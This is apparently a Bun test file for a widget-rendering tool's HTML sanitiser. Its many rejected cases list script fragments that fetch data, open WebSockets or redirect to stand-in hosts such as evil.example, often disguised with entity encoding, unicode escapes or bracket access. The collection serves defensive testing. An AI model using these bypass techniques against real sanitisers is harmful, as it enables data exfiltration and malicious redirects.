import { describe, expect, test } from 'bun:test'
import { ShowWidgetTool } from '../ShowWidgetTool.js'
import {
  MAX_WIDGET_CODE_CHARS,
  buildArtifactFence,
  validateWidgetInput,
} from '../validation.js'

const VALID_HTML = `<div style="padding:16px" role="img" aria-label="Split bar">
  <h2 style="font-size:18px;font-weight:500;margin:0 0 8px">Revenue by quarter</h2>
  <svg viewBox="0 0 320 120" role="img" aria-label="Bar chart">
    <title>Revenue by quarter</title>
    <rect x="0" y="20" width="60" height="100" fill="#378ADD"></rect>
  </svg>
  <style>.metric { color: var(--color-text-primary, #222); }</style>
  <script>document.querySelector('h2').dataset.ready = 'true';</script>
</div>`

const VALID_SVG = `<svg viewBox="0 0 380 120" role="img" aria-label="Flow">
  <title>Flow</title>
  <desc>Two boxes connected by an arrow.</desc>
  <defs><marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z"></path></marker></defs>
  <rect x="8" y="40" width="120" height="40" rx="8"></rect>
  <line x1="128" y1="60" x2="240" y2="60" stroke="currentColor" marker-end="url(#arrow)"></line>
  <use href="#arrow"></use>
</svg>`

function callTool(input: Record<string, unknown>) {
  return ShowWidgetTool.call(input as never, {} as never)
}

async function run(input: Record<string, unknown>) {
  const result = await callTool(input)
  return result.data
}

describe('show_widget valid input', () => {
  test('returns one fenced artifact-html block with frontmatter', async () => {
    const data = await run({
      title: 'Revenue chart',
      description: 'Quarterly revenue as a bar chart.',
      widget_code: VALID_HTML,
    })
    expect(data.success).toBe(true)
    expect(data.fence).toContain(
      '```artifact-html\n---\ntitle: Revenue chart\n',
    )
    expect(data.fence).toContain(
      'description: Quarterly revenue as a bar chart.\n',
    )
    expect(data.fence).toContain('Revenue by quarter')
    expect(data.fence.trimEnd().endsWith('```')).toBe(true)
    expect(data.fence).toBe(data.message)

    const fenceLines = data.fence.match(/^```/gm) ?? []
    expect(fenceLines).toHaveLength(2)
  })

  test('accepts inline SVG, inline scripts, fragments, and data: URIs', async () => {
    for (const code of [
      VALID_SVG,
      '<svg><use href="#arrow"></use></svg>',
      '<a href="#section">jump</a>',
      '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">',
      '<script>const n = 1; document.title = String(n)</script>',
      '<script>const v = Math.round(3.4); const xs = Array.from([1, 2]); document.body.dataset.v = String(v + xs.length)</script>',
      '<div style="background:url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)">x</div>',
      '<svg><defs><linearGradient id="g"></linearGradient></defs><rect fill="url(#g)"></rect></svg>',
      '<div style="color:var(--color-text-primary);border-radius:var(--border-radius-md)">x</div>',
      `<script>document.querySelector('[data-x]')</script>`,
      `<script>const data = { fetch: 1, require: 2, import: 3 }; document.body.dataset.v = String(data.fetch + data.require + data.import)</script>`,
      `<script>const name = 'import'; document.body.dataset.n = name</script>`,
      `<script>const width = window["innerWidth"]; this.value = String(width)</script>`,
      `<script>const requireLoading = true; const fetchCount = 2; const WebSocketStatus = 'open'</script>`,
      `<script>const importedValue = 1; const value = array["length"] + importedValue</script>`,
      `<script>new Date().toISOString(); requestAnimationFrame(() => {}); String.fromCodePoint(65)</script>`,
      `<script>const page = window.location.pathname; document.body.dataset.p = page</script>`,
      `<script>const location = { pathname: '/' }; document.body.dataset.p = location.pathname</script>`,
      `<script>const settings = { location: 'home' }; document.body.dataset.l = settings.location</script>`,
      `<script>const state = {}; state.location = 'home'; const opened = false</script>`,
    ]) {
      const data = await run({ title: 'Inline', widget_code: code })
      expect(data.success).toBe(true)
      expect(data.fence).toContain('```artifact-html')
    }
  })

  test('omits description frontmatter when description is absent', () => {
    const fence = buildArtifactFence('Bare', '', '<p>ok</p>')
    expect(fence).toBe(
      '```artifact-html\n---\ntitle: Bare\n---\n<p>ok</p>\n```',
    )
    expect(fence).not.toContain('description:')
  })
})

describe('show_widget rejects empty input', () => {
  test('empty title', async () => {
    const data = await run({ title: '   ', widget_code: '<p>ok</p>' })
    expect(data.success).toBe(false)
    expect(data.message).toContain('title must not be empty')
  })

  test('empty widget_code', async () => {
    const data = await run({ title: 'Title', widget_code: '\n  \t ' })
    expect(data.success).toBe(false)
    expect(data.message).toContain('widget_code must not be empty')
  })

  test('schema requires title and widget_code', () => {
    const schema = ShowWidgetTool.inputSchema
    expect(() => schema.parse({ widget_code: '<p>ok</p>' })).toThrow()
    expect(() => schema.parse({ title: 'Title' })).toThrow()
  })
})

describe('show_widget rejects external resources', () => {
  const cases: Array<[string, string]> = [
    [
      'external script',
      '<script src="https://cdn.example.com/lib.js"></script>',
    ],
    [
      'external stylesheet',
      '<link rel="stylesheet" href="https://example.com/a.css">',
    ],
    [
      'external css url',
      '<div style="background:url(https://example.com/bg.png)">x</div>',
    ],
    ['protocol-relative image', '<img src="//cdn.example.com/a.png" alt="a">'],
    ['relative image', '<img src="assets/a.png" alt="a">'],
    ['external anchor', '<a href="https://example.com">link</a>'],
    ['external srcset', '<img srcset="https://example.com/a.png 1x" alt="a">'],
    [
      'external module import',
      '<script>import x from "https://esm.sh/x"</script>',
    ],
    ['external dynamic import', '<script>import("//esm.sh/x")</script>'],
    ['external fetch', '<script>fetch("https://api.example.com/x")</script>'],
    ['css import', '<style>@import "theme.css";</style>'],
    [
      'meta refresh with url=',
      '<meta http-equiv="refresh" content="0;url=https://example.com">',
    ],
    [
      'meta refresh without url=',
      '<meta http-equiv="refresh" content="0;https://evil.example">',
    ],
    ['uppercase meta refresh', '<META HTTP-EQUIV="REFRESH" CONTENT="5">'],
    [
      'entity-encoded meta refresh',
      '<meta http-equiv="re&#x66;resh" content="0">',
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).not.toBe('')
    })
  }
})

describe('show_widget rejects network/module constructs regardless of target', () => {
  const cases: Array<[string, string]> = [
    ['same-origin fetch', '<script>fetch("/api/data")</script>'],
    ['bare fetch', '<script>fetch("local.json")</script>'],
    ['no-arg fetch', '<script>fetch()</script>'],
    ['relative EventSource', '<script>new EventSource("/events")</script>'],
    ['bare EventSource', '<script>new EventSource("events")</script>'],
    [
      'ws WebSocket',
      '<script>new WebSocket("ws://evil.example/socket")</script>',
    ],
    [
      'wss WebSocket',
      '<script>new WebSocket("wss://evil.example/socket")</script>',
    ],
    [
      'local module import',
      '<script type="module">import x from "./x.js"</script>',
    ],
    [
      'bare module import',
      '<script type="module">import "some-package"</script>',
    ],
    [
      'side-effect module import',
      '<script type="module">import "./x.js"</script>',
    ],
    ['local require', '<script>const x = require("./x")</script>'],
    ['bare require', '<script>const x = require("x")</script>'],
    ['relative dynamic import', '<script>import("./x.js")</script>'],
    ['bare dynamic import', '<script>import("x")</script>'],
    [
      'entity-encoded fetch',
      '<button onclick="fetch&#40;/api&#41;">x</button>',
    ],
    [
      'entity-encoded WebSocket',
      '<button onclick="new WebSocket&#40;&quot;ws://evil&quot;&#41;">x</button>',
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).toMatch(/must not use/)
    })
  }
})

describe('show_widget rejects named-entity obfuscation', () => {
  const cases: Array<[string, string]> = [
    [
      'named-entity fetch in onclick',
      `<button onclick="fetch&lpar;'https://evil'/&rpar;">x</button>`,
    ],
    [
      'named-entity fetch in onload',
      `<svg onload="fetch&lpar;'/api'/&rpar;"></svg>`,
    ],
    [
      'named-entity WebSocket',
      `<svg onload="new WebSocket&lpar;'ws://evil'/&rpar;"></svg>`,
    ],
    [
      'named-entity EventSource',
      `<button onclick="new EventSource&lpar;'/events'/&rpar;">x</button>`,
    ],
    [
      'named-entity require',
      `<button onclick="require&lpar;'fs'&rpar;">x</button>`,
    ],
    [
      'named-entity dynamic import',
      `<button onclick="import&lpar;'./x.js'&rpar;">x</button>`,
    ],
    [
      'named-entity bracket access',
      `<button onclick="window&lsqb;&quot;fetch&quot;&rsqb;&lpar;'/x'/&rpar;">x</button>`,
    ],
    [
      'named-entity member access',
      `<button onclick="window&period;fetch&lpar;'/x'/&rpar;">x</button>`,
    ],
    [
      'named-entity optional call',
      `<button onclick="fetch&quest;&period;&lpar;'/x'/&rpar;">x</button>`,
    ],
    [
      'named-entity whitespace',
      `<button onclick="fetch&Tab;&lpar;'/x'/&rpar;">x</button>`,
    ],
    [
      'named-entity colon and slash',
      `<button onclick="fetch&lpar;'https&colon;&sol;&sol;evil'&rpar;">x</button>`,
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).toMatch(/must not use/)
    })
  }
})

describe('show_widget rejects optional-call and member/bracket retrieval', () => {
  const cases: Array<[string, string]> = [
    ['optional fetch', '<script>fetch?.("https://evil")</script>'],
    ['optional member fetch', '<script>window.fetch?.("/x")</script>'],
    ['optional WebSocket', '<script>WebSocket?.("ws://evil")</script>'],
    ['optional EventSource', '<script>EventSource?.("/events")</script>'],
    ['optional require', '<script>require?.("fs")</script>'],
    ['optional dynamic import', '<script>import?.("./x.js")</script>'],
    ['window bracket fetch', '<script>window["fetch"]("/x")</script>'],
    ['globalThis bracket fetch', '<script>globalThis["fetch"]("/x")</script>'],
    ['self bracket fetch', '<script>self["fetch"]("/x")</script>'],
    ['this bracket fetch', '<script>this["fetch"]("/x")</script>'],
    [
      'window bracket WebSocket',
      '<script>new window["WebSocket"]("ws://evil")</script>',
    ],
    [
      'window bracket EventSource',
      '<script>new window["EventSource"]("/events")</script>',
    ],
    ['window bracket require', '<script>window["require"]("fs")</script>'],
    ['window bracket import', '<script>window["import"]("./x.js")</script>'],
    ['optional bracket fetch', '<script>window?.["fetch"]("/x")</script>'],
    ['member alias fetch', '<script>const f = window.fetch; f("/x")</script>'],
    [
      'member alias require',
      '<script>const r = globalThis.require; r("fs")</script>',
    ],
    [
      'optional member alias',
      '<script>const f = self?.fetch; f("/x")</script>',
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).toMatch(/must not use/)
    })
  }
})

describe('show_widget rejects slash-separated and uppercase attributes', () => {
  const cases: Array<[string, string]> = [
    [
      'slash-separated quoted img src',
      '<img/src="https://evil.example/a.png">',
    ],
    [
      'slash-separated quoted script src',
      '<script/src="https://evil.example/a.js"></script>',
    ],
    [
      'slash-separated unquoted img src',
      '<img/src=https://evil.example/a.png>',
    ],
    ['uppercase slash-separated src', '<IMG/SRC="https://evil.example/a.png">'],
    [
      'multiple slash separators',
      '<link/rel="stylesheet"/href="https://evil.example/a.css">',
    ],
    [
      'uppercase attribute separated by slash',
      '<SCRIPT/SRC="https://evil.example/a.js"></SCRIPT>',
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
    })
  }
})

describe('show_widget scans tags with a quoted > inside attributes', () => {
  const cases: Array<[string, string]> = [
    [
      'double-quoted > before script src',
      '<script data-x=">" src="https://evil.example/a.js"></script>',
    ],
    [
      'single-quoted > before script src',
      "<script data-x='>' src='https://evil.example/a.js'></script>",
    ],
    [
      'uppercase quoted > before script src',
      '<SCRIPT DATA-X=">" SRC="https://evil.example/a.js"></SCRIPT>',
    ],
    [
      'svg script href after quoted >',
      '<svg><script data-x=">" href="https://evil.example/a.js"></script></svg>',
    ],
    [
      'svg script xlink:href after quoted >',
      '<svg><script data-x=">" xlink:href="https://evil.example/a.js"></script></svg>',
    ],
    [
      'quoted > before img src',
      '<img data-x=">" src="https://evil.example/a.png">',
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
    })
  }
})

describe('show_widget rejects JS-escape obfuscation', () => {
  const cases: Array<[string, string]> = [
    [
      'unicode-escaped fetch',
      String.raw`<script>\u0066etch("https://evil")</script>`,
    ],
    [
      'unicode escape inside fetch',
      String.raw`<script>f\u0065tch("https://evil")</script>`,
    ],
    [
      'braced unicode fetch',
      String.raw`<script>\u{66}etch("https://evil")</script>`,
    ],
    [
      'hex-escaped fetch',
      String.raw`<script>\x66etch("https://evil")</script>`,
    ],
    [
      'entity plus escape in onclick',
      String.raw`<button onclick="f\u0065tch&lpar;'https://evil'/&rpar;">x</button>`,
    ],
    [
      'unicode-escaped require',
      String.raw`<script>\u0072equire("fs")</script>`,
    ],
    [
      'unicode-escaped WebSocket',
      String.raw`<script>new \u0057ebSocket("ws://evil")</script>`,
    ],
    [
      'unicode-escaped dynamic import',
      String.raw`<script>\u0069mport("./x.js")</script>`,
    ],
    [
      'unicode-escaped bracket fetch',
      String.raw`<script>window["f\u0065tch"]("/x")</script>`,
    ],
    [
      'unicode-escaped location',
      String.raw`<script>window.\u006cocation.href = "https://evil"</script>`,
    ],
    [
      'entity plus escape window.open',
      String.raw`<button onclick="\u0077indow&period;open&lpar;'https://evil'/&rpar;">x</button>`,
    ],
    [
      'entity plus escape this.location',
      String.raw`<button onclick="\u0074his&lsqb;&quot;location&quot;&rsqb;='https://evil'">x</button>`,
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).toMatch(/must not/)
    })
  }
})

describe('show_widget rejects external navigation sinks', () => {
  const cases: Array<[string, string]> = [
    ['bare location assignment', '<script>location = "https://evil"</script>'],
    [
      'location.href assignment',
      '<script>location.href = "https://evil"</script>',
    ],
    ['location.assign', '<script>location.assign("https://evil")</script>'],
    ['location.replace', '<script>location.replace("https://evil")</script>'],
    [
      'bracketed location href',
      '<script>location["href"] = "https://evil"</script>',
    ],
    ['window.open', '<script>window.open("https://evil")</script>'],
    [
      'bracketed window.open',
      '<script>window["open"]("https://evil")</script>',
    ],
    ['self.open', '<script>self.open("https://evil")</script>'],
    ['globalThis.open', '<script>globalThis.open("https://evil")</script>'],
    ['top.open', '<script>top.open("https://evil")</script>'],
    ['parent.open', '<script>parent.open("https://evil")</script>'],
    ['this.open', '<script>this.open("https://evil")</script>'],
    ['bracketed this.open', '<script>this["open"]("https://evil")</script>'],
    ['bare open', '<script>open("https://evil")</script>'],
    ['optional bare open', '<script>open?.("https://evil")</script>'],
    ['optional window.open', '<script>window?.open("https://evil")</script>'],
    [
      'optional window.open call',
      '<script>window.open?.("https://evil")</script>',
    ],
    [
      'optional bracketed window.open',
      '<script>window?.["open"]("https://evil")</script>',
    ],
    [
      'optional bracketed window.open call',
      '<script>window["open"]?.("https://evil")</script>',
    ],
    [
      'aliased window.open',
      '<script>const o = window.open; o("https://evil")</script>',
    ],
    [
      'aliased bracketed window.open',
      '<script>const o = window["open"]; o("https://evil")</script>',
    ],
    [
      'this.location assignment',
      '<script>this.location = "https://evil"</script>',
    ],
    [
      'bracketed this.location assignment',
      '<script>this["location"] = "https://evil"</script>',
    ],
    [
      'frames location assignment',
      '<script>frames[0].location = "https://evil"</script>',
    ],
    [
      'document.defaultView location assignment',
      '<script>document.defaultView.location = "https://evil"</script>',
    ],
    [
      'window.frames location assignment',
      '<script>window.frames[0].location = "https://evil"</script>',
    ],
    [
      'window.top.location assignment',
      '<script>window.top.location = "https://evil"</script>',
    ],
    [
      'window.parent.location assignment',
      '<script>window.parent.location = "https://evil"</script>',
    ],
    [
      'window.top.location.href assignment',
      '<script>window.top.location.href = "https://evil"</script>',
    ],
    [
      'window.opener.location assignment',
      '<script>window.opener.location = "https://evil"</script>',
    ],
    [
      'bare opener.location assignment',
      '<script>opener.location = "https://evil"</script>',
    ],
    [
      'self.top.location assignment',
      '<script>self.top.location = "https://evil"</script>',
    ],
    [
      'parent.top.location assignment',
      '<script>parent.top.location = "https://evil"</script>',
    ],
    [
      'window.self.location assignment',
      '<script>window.self.location = "https://evil"</script>',
    ],
    [
      'window.globalThis.location assignment',
      '<script>window.globalThis.location = "https://evil"</script>',
    ],
    [
      'window.top.frames location assignment',
      '<script>window.top.frames[0].location = "https://evil"</script>',
    ],
    [
      'bracketed document.defaultView location assignment',
      `<script>document["defaultView"].location = "https://evil"</script>`,
    ],
    [
      'bracketed chained owner location assignment',
      `<script>window["top"].location = "https://evil"</script>`,
    ],
    [
      'optional chained owner location assignment',
      `<script>window?.top?.location = "https://evil"</script>`,
    ],
    [
      'bracketed chained location assignment',
      `<script>window.top?.["location"] = "https://evil"</script>`,
    ],
    ['window.top.open', '<script>window.top.open("https://evil")</script>'],
    [
      'window.parent.open',
      '<script>window.parent.open("https://evil")</script>',
    ],
    [
      'window.opener.open',
      '<script>window.opener.open("https://evil")</script>',
    ],
    [
      'chained bracketed open',
      `<script>window["top"]["open"]("https://evil")</script>`,
    ],
    [
      'window.location assignment',
      '<script>window.location = "https://evil"</script>',
    ],
    [
      'window.location.href assignment',
      '<script>window.location.href = "https://evil"</script>',
    ],
    [
      'bracketed window.location href assignment',
      '<script>window["location"]["href"] = "https://evil"</script>',
    ],
    [
      'window.location.assign',
      '<script>window.location.assign("https://evil")</script>',
    ],
    [
      'window.location.replace',
      '<script>window.location.replace("https://evil")</script>',
    ],
    ['top.location', '<script>top.location = "https://evil"</script>'],
    [
      'parent.location.href',
      '<script>parent.location.href = "https://evil"</script>',
    ],
    [
      'document.location',
      '<script>document.location = "https://evil"</script>',
    ],
    [
      'bracketed owner location',
      '<script>window["location"].href = "https://evil"</script>',
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Bad', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).toMatch(/must not/)
    })
  }
})

describe('show_widget allows local location objects and reads', () => {
  const cases: Array<[string, string]> = [
    [
      'state location href read',
      `<script>const state = { location: { href: '/' } }; document.body.dataset.h = state.location.href</script>`,
    ],
    [
      'local cfg location replace call',
      `<script>const f = () => {}; const cfg = { location: { replace: f } }; cfg.location.replace('/')</script>`,
    ],
    [
      'local location object href read',
      `<script>const location = { href: '/' }; document.body.dataset.h = location.href</script>`,
    ],
    [
      'item location href read',
      `<script>const item = { location: { href: '/' } }; document.body.dataset.h = item.location.href</script>`,
    ],
    [
      'window location pathname read',
      `<script>document.body.dataset.p = window.location.pathname</script>`,
    ],
    [
      'this value read',
      `<script>document.body.dataset.v = this.value</script>`,
    ],
    [
      'local object open call',
      `<script>const cfg = { open: () => {} }; cfg.open()</script>`,
    ],
    [
      'local bracketed open call',
      `<script>const store = { open: () => {} }; store["open"]()</script>`,
    ],
  ]

  for (const [name, code] of cases) {
    test(name, async () => {
      const data = await run({ title: 'Ok', widget_code: code })
      expect(data.success).toBe(true)
    })
  }
})

describe('show_widget rejects full documents', () => {
  for (const code of [
    '<!doctype html><html><body><p>x</p></body></html>',
    '<html><head><title>x</title></head><body>x</body></html>',
    '<body><div>x</div></body>',
    '<head><style>p{color:red}</style></head>',
  ]) {
    test(code.slice(0, 24), async () => {
      const data = await run({ title: 'Doc', widget_code: code })
      expect(data.success).toBe(false)
      expect(data.message).toContain('must be a fragment')
    })
  }
})

describe('show_widget fence shape and size', () => {
  test('rejects code containing a closing fence line', async () => {
    const data = await run({
      title: 'Fence',
      widget_code: '<p>ok</p>\n```\n<p>more</p>',
    })
    expect(data.success).toBe(false)
    expect(data.message).toContain('triple-backtick')
  })

  test('frontmatter cannot be broken by newlines in the title', async () => {
    const data = await run({
      title: 'Line one\n---\ninjected: true',
      widget_code: '<p>ok</p>',
    })
    expect(data.success).toBe(true)
    expect(data.fence).toContain('title: "Line one --- injected: true"')
    expect(data.fence.match(/^---$/gm)).toHaveLength(2)
  })

  test('accepts up to the code cap and rejects one character more', async () => {
    const atCap = `x${'a'.repeat(MAX_WIDGET_CODE_CHARS - 1)}`
    expect(
      validateWidgetInput({ title: 'T', widget_code: atCap }).code,
    ).toHaveLength(MAX_WIDGET_CODE_CHARS)

    const tooLarge = 'a'.repeat(MAX_WIDGET_CODE_CHARS + 1)
    expect(() =>
      validateWidgetInput({ title: 'T', widget_code: tooLarge }),
    ).toThrow(/characters or fewer/)
  })

  test('keeps large results in the conversation (>= 1.2M chars)', () => {
    expect(ShowWidgetTool.maxResultSizeChars).toBeGreaterThanOrEqual(1_200_000)
  })

  test('is read-only, concurrent, deferred, and non-destructive', () => {
    expect(ShowWidgetTool.isReadOnly({} as never)).toBe(true)
    expect(ShowWidgetTool.isConcurrencySafe({} as never)).toBe(true)
    expect(ShowWidgetTool.isDestructive({} as never)).toBe(false)
    expect(ShowWidgetTool.shouldDefer).toBe(true)
  })
})
